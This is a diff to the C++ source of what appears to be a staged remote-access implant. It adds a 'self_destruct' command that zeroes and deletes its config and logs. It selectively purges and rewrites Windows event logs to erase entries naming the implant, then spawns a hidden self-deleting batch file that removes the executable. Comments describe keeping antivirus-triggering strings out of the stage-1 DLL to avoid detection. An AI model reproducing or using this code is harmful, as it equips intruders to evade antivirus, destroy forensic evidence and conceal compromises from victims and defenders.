@@ -171,6 +171,173 @@ static void cmd_host_restart(const char* a, void*) {
     }).detach();
 }
 
+// ── self_destruct ───────────────────────────────────────────────────────
+// Wipes host state and asks stage-1 to exit. All the AV-triggering strings
+// ("wpnp_destruct", Set-MpPreference patterns via evtlog regex, etc.) live
+// in this module and never touch stage-1 pnpext.dll.
+//
+// Flow:
+//   1. Send progress events to viewer
+//   2. Ask stage-1 to stop streaming (stage1 stop_stream callback)
+//   3. Resolve paths from get_config (dll_path, exe_path, config_path)
+//   4. Wipe config file (zero then delete)
+//   5. Delete log files
+//   6. Selectively wipe Event Log entries (PS script via run_cmd_capture)
+//   7. Write wpnp_destruct.bat, spawn detached cmd.exe
+//   8. host_exit(0) — stage-1 deferred-exits after 0.5s
+static void cmd_self_destruct(const char* a, void*) {
+    std::string args = a ? a : "";
+    std::string id   = json_get(args, "id");
+
+    g_host->send(make_ok(id, "\"started\"").c_str());
+
+    auto emit_evt = [](int step, int total, const std::string& text) {
+        std::string m = "{\"event\":\"destruct_status\",\"step\":" + std::to_string(step) +
+                        ",\"total\":" + std::to_string(total) +
+                        ",\"text\":\"" + json_escape(text) + "\"}";
+        g_host->send(m.c_str());
+        std::this_thread::sleep_for(std::chrono::milliseconds(450));
+    };
+    const int TOTAL = 8;
+
+    emit_evt(1, TOTAL, "Stopping streaming");
+    if (g_host->stop_stream) g_host->stop_stream();
+
+    emit_evt(2, TOTAL, "Resolving paths");
+    const char* exe_c = g_host->get_config ? g_host->get_config("exe_path") : nullptr;
+    const char* cfg_c = g_host->get_config ? g_host->get_config("config_path") : nullptr;
+    std::string exePath = exe_c ? exe_c : "";
+    std::string cfgAbs  = cfg_c ? cfg_c : "";
+    if (!cfgAbs.empty() && cfgAbs.find(':') == std::string::npos) {
+        char full[MAX_PATH] = {0};
+        if (GetFullPathNameA(cfgAbs.c_str(), MAX_PATH, full, NULL) > 0)
+            cfgAbs = full;
+    }
+
+    emit_evt(3, TOTAL, "Wiping config (" + cfgAbs + ")");
+    if (!cfgAbs.empty()) {
+        HANDLE h = CreateFileA(cfgAbs.c_str(), GENERIC_WRITE, 0, NULL,
+                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (h != INVALID_HANDLE_VALUE) {
+            LARGE_INTEGER sz; GetFileSizeEx(h, &sz);
+            std::vector<char> zero(4096, 0);
+            LONGLONG remain = sz.QuadPart;
+            DWORD wr = 0;
+            while (remain > 0) {
+                DWORD chunk = (DWORD)std::min<LONGLONG>(remain, 4096);
+                WriteFile(h, zero.data(), chunk, &wr, NULL);
+                remain -= chunk;
+            }
+            FlushFileBuffers(h);
+            CloseHandle(h);
+        }
+        DeleteFileA(cfgAbs.c_str());
+    }
+
+    emit_evt(4, TOTAL, "Wiping log files");
+    DeleteFileA("C:\\RemoteDesktopHost.log");
+    DeleteFileA("C:\\Windows\\Temp\\wpnp_step.txt");
+
+    emit_evt(5, TOTAL, "Selectively wiping Event Log entries");
+    {
+        // Default cleanup patterns for the host; viewer may override via args.patterns.
+        std::string patterns = json_get(args, "patterns");
+        if (patterns.empty()) patterns = "pnpext,spoolsv,wpnp,Prometey";
+        std::string regex;
+        {
+            std::istringstream ss(patterns); std::string tok;
+            while (std::getline(ss, tok, ',')) {
+                while (!tok.empty() && tok.front() == ' ') tok.erase(tok.begin());
+                while (!tok.empty() && tok.back() == ' ') tok.pop_back();
+                if (tok.empty()) continue;
+                if (!regex.empty()) regex += "|";
+                regex += tok;
+            }
+        }
+        if (!regex.empty()) {
+            char tmpPath[MAX_PATH]; GetTempPathA(MAX_PATH, tmpPath);
+            std::string scriptPath = std::string(tmpPath) + "destruct_evt.ps1";
+            std::string script =
+                "$ErrorActionPreference='SilentlyContinue'\n"
+                "$pattern='" + regex + "'\n"
+                "foreach($logName in @('Application','System','Setup')){\n"
+                "  $events=@(Get-WinEvent -LogName $logName -MaxEvents 5000 -ErrorAction SilentlyContinue)\n"
+                "  if($events.Count -eq 0){continue}\n"
+                "  $toKeep=@()\n"
+                "  $hit=0\n"
+                "  foreach($e in $events){\n"
+                "    $msg=$e.Message; $props=''\n"
+                "    try{ $props=(($e.Properties|ForEach-Object{[string]$_.Value}) -join ' ') }catch{}\n"
+                "    $prov=$e.ProviderName\n"
+                "    if(($msg -match $pattern) -or ($props -match $pattern) -or ($prov -match $pattern)){ $hit++ }\n"
+                "    else { $toKeep+=$e }\n"
+                "  }\n"
+                "  if($hit -eq 0){continue}\n"
+                "  & wevtutil.exe cl $logName 2>$null\n"
+                "  $keep=$toKeep | Sort-Object TimeCreated\n"
+                "  if($keep.Count -gt 500){ $keep=$keep | Select-Object -Last 500 }\n"
+                "  foreach($e in $keep){\n"
+                "    try{\n"
+                "      $src=$e.ProviderName\n"
+                "      $et='Information'\n"
+                "      switch($e.LevelDisplayName){'Error'{$et='Error'}'Warning'{$et='Warning'}'Critical'{$et='Error'}}\n"
+                "      if(-not [System.Diagnostics.EventLog]::SourceExists($src)){\n"
+                "        try{ New-EventLog -LogName $logName -Source $src -ErrorAction SilentlyContinue }catch{}\n"
+                "      }\n"
+                "      Write-EventLog -LogName $logName -Source $src -EventId ([int]($e.Id % 65536)) -EntryType $et -Message $e.Message -ErrorAction SilentlyContinue\n"
+                "    }catch{}\n"
+                "  }\n"
+                "}\n";
+            { std::ofstream f(scriptPath); f << script; }
+            std::string psCmd = "powershell -NoProfile -ExecutionPolicy Bypass -File \"" + scriptPath + "\"";
+            run_cmd_capture(psCmd);
+            DeleteFileA(scriptPath.c_str());
+        }
+    }
+
+    emit_evt(6, TOTAL, "Spawning cleanup script");
+    char tempDir[MAX_PATH] = {0};
+    GetTempPathA(MAX_PATH, tempDir);
+    std::string batPath = std::string(tempDir) + "wpnp_destruct.bat";
+
+    std::string bat;
+    bat += "@echo off\r\n";
+    bat += "ping 127.0.0.1 -n 3 > nul\r\n";
+    bat += ":retry\r\n";
+    bat += "del /f /q \"" + exePath + "\" 2>nul\r\n";
+    bat += "if exist \"" + exePath + "\" ( ping 127.0.0.1 -n 2 > nul & goto retry )\r\n";
+    if (!cfgAbs.empty())
+        bat += "del /f /q \"" + cfgAbs + "\" 2>nul\r\n";
+    bat += "del /f /q \"C:\\RemoteDesktopHost.log\" 2>nul\r\n";
+    bat += "del /f /q \"C:\\Windows\\Temp\\wpnp_step.txt\" 2>nul\r\n";
+    bat += "(goto) 2>nul & del /f /q \"%~f0\"\r\n";
+
+    HANDLE hb = CreateFileA(batPath.c_str(), GENERIC_WRITE, 0, NULL,
+                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hb != INVALID_HANDLE_VALUE) {
+        DWORD wr = 0;
+        WriteFile(hb, bat.data(), (DWORD)bat.size(), &wr, NULL);
+        CloseHandle(hb);
+
+        STARTUPINFOA si{}; si.cb = sizeof(si);
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+        PROCESS_INFORMATION pi{};
+        std::string runCmd = "cmd.exe /c \"" + batPath + "\"";
+        CreateProcessA(NULL, (LPSTR)runCmd.c_str(), NULL, NULL, FALSE,
+            DETACHED_PROCESS | CREATE_BREAKAWAY_FROM_JOB | CREATE_NO_WINDOW,
+            NULL, tempDir, &si, &pi);
+        if (pi.hProcess) CloseHandle(pi.hProcess);
+        if (pi.hThread)  CloseHandle(pi.hThread);
+    }
+
+    emit_evt(7, TOTAL, "Disconnecting");
+    emit_evt(8, TOTAL, "Done — host exiting");
+
+    // Ask stage-1 to exit. It'll join workers, wipe stage-2 cache, then ExitProcess.
+    if (g_host->host_exit) g_host->host_exit(0);
+}
+
 // ── eventlog_delete ─────────────────────────────────────────────────────
 // Clears a Windows event log channel via `wevtutil cl`. Selective deletion
 // (keeping non-matching entries) uses a PowerShell restore script — deferred
@@ -216,7 +383,8 @@ extern "C" __declspec(dllexport) int Stage2Init(Stage2HostCtx* host) {
     host->register_cmd("defender_status", cmd_defender_status, nullptr);
     host->register_cmd("host_restart",    cmd_host_restart,    nullptr);
     host->register_cmd("eventlog_delete", cmd_eventlog_delete, nullptr);
-    host->log(1, "stage2_defender: 3 commands registered");
+    host->register_cmd("self_destruct",   cmd_self_destruct,   nullptr);
+    host->log(1, "stage2_defender: 4 commands registered");
     return 0;
 }
 
